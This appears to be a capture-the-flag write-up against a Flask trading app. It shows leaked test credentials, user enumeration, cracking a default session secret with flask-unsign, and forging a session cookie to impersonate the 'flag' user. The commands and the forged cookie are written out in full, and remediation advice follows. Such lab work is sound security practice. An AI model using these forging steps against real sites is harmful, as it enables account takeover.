## Summary

A Flask-based trading platform web application with a login flow that uses
session cookies containing a `user_id` field. The application's Flask secret
key was left as the default value `your_secret_key`, allowing an attacker to
forge arbitrary session cookies and impersonate any user -- including the
"flag" user whose display name contains the flag.

## Attack Chain

### Step 1: Reconnaissance -- Credential Leak in HTML Comment

The login page at `/` contained an HTML comment exposing test credentials:

```html
<!-- TODO: Delete the testing account (test:test). -->
```

The login form accepted only a username. Submitting `test` redirected to
`/password/test`, a second-factor password page. The password `test`
authenticated successfully and redirected to `/dashboard` with a Flask
session cookie:

```
Set-Cookie: session=eyJ1c2VyX2lkIjoxMDAzMn0.ajhMgA.LU9_05gzWkj3Z9D9HULpsNypFtU; HttpOnly; Path=/
```

### Step 2: Session Cookie Analysis -- Flask Session Decoding

The session cookie is a Flask-signed token (itsdangerous URLSafeTimedSerializer).
Decoding the base64 payload revealed:

```json
{"user_id": 10032}
```

The application uses this `user_id` to identify the authenticated user. The
dashboard endpoint reads the session, extracts `user_id`, and renders user-
specific content (display name, etc.).

### Step 3: User Enumeration -- Discovering the Flag User

The login endpoint `/` accepts a username via POST. If the user exists, it
redirects to `/password/<username>`. If not, it returns the login page with no
redirect. By probing various usernames, `flag` was identified as a valid user:

```
POST / -> 302 Location: /password/flag
```

The `/password/flag` page revealed the flag user's `user_id` in a hidden form
field:

```html
<input type="text" id="user_id" name="user_id" value="10052" hidden>
```

### Step 4: Secret Key Cracking -- flask-unsign

The Flask session cookie is cryptographically signed using the application's
`SECRET_KEY`. If the key is weak or default, it can be brute-forced.

Using `flask-unsign` with its built-in wordlist (23,552 entries sourced from
GitHub, StackOverflow, and common defaults):

```bash
$ flask-unsign --unsign \
    --cookie 'eyJ1c2VyX2lkIjoxMDAzMn0.ajhMgA.LU9_05gzWkj3Z9D9HULpsNypFtU'

[*] Session decodes to: {'user_id': 10032}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 23552 attempts
'your_secret_key'
```

The secret key was `your_secret_key` -- a common placeholder/default value
that was never changed for production deployment.

### Step 5: Session Forgery -- Impersonating the Flag User

With the secret key in hand, a new session cookie was forged with
`user_id: 10052` (the flag user):

```bash
$ flask-unsign --sign \
    --cookie '{"user_id":10052}' \
    --secret 'your_secret_key'

eyJ1c2VyX2lkIjoxMDA1Mn0.ajhNVA.c-DkR9uWgkI_ADMLT4WgQrQPDg0
```

### Step 6: Flag Retrieval -- Dashboard Access

The forged cookie was used to access the dashboard:

```bash
$ curl -s \
    -b 'session=eyJ1c2VyX2lkIjoxMDA1Mn0.ajhNVA.c-DkR9uWgkI_ADMLT4WgQrQPDg0' \
    http://host.containers.internal:32771/dashboard
```

The dashboard rendered:

```html
<h5 class="card-title">Welcome, Flag FLAG{70a85740aac7f4cf}</h5>
```

The flag was embedded in the flag user's display name.

## Vulnerabilities Identified

| # | Vulnerability                    | Severity | CVSS (est.) |
|---|----------------------------------|----------|-------------|
| 1 | Default/weak Flask SECRET_KEY    | Critical | 9.8         |
| 2 | Credentials in HTML comment      | Medium   | 5.3         |
| 3 | User enumeration via redirect    | Low      | 3.7         |
| 4 | User ID exposure in hidden field | Low      | 3.1         |

## Remediation

1. **Replace the Flask SECRET_KEY** with a cryptographically random value of
   at least 32 bytes. Never deploy with placeholder defaults. Generate with:
   ```python
   import secrets
   secrets.token_hex(32)
   ```

2. **Remove the HTML comment** exposing test credentials. Delete the test
   account entirely.

3. **Prevent user enumeration** by returning identical responses for valid and
   invalid usernames (same HTTP status, same timing, same redirect behavior).

4. **Remove hidden form fields** exposing internal identifiers (`user_id`).
   The server should resolve user identity from the session alone, never from
   client-supplied data.

5. **Implement rate limiting** on authentication endpoints to slow brute-
   force attacks against session signing keys.

## Tools Used

- `curl` -- HTTP requests and endpoint enumeration
- `python3` -- Session cookie decoding, SQL injection testing, user enumeration
- `flask-unsign` -- Flask session cookie cracking and forging
- `flask-unsign[wordlist]` -- Built-in wordlist of 23,552 common secret keys

## Key Takeaway

The entire exploit chain hinges on a single failure: a default secret key
left in production. Every subsequent step -- session forgery, user
impersonation, flag retrieval -- was a direct consequence of that one
oversight. The weakest link in any system is never the machine. It is the
person who built it.
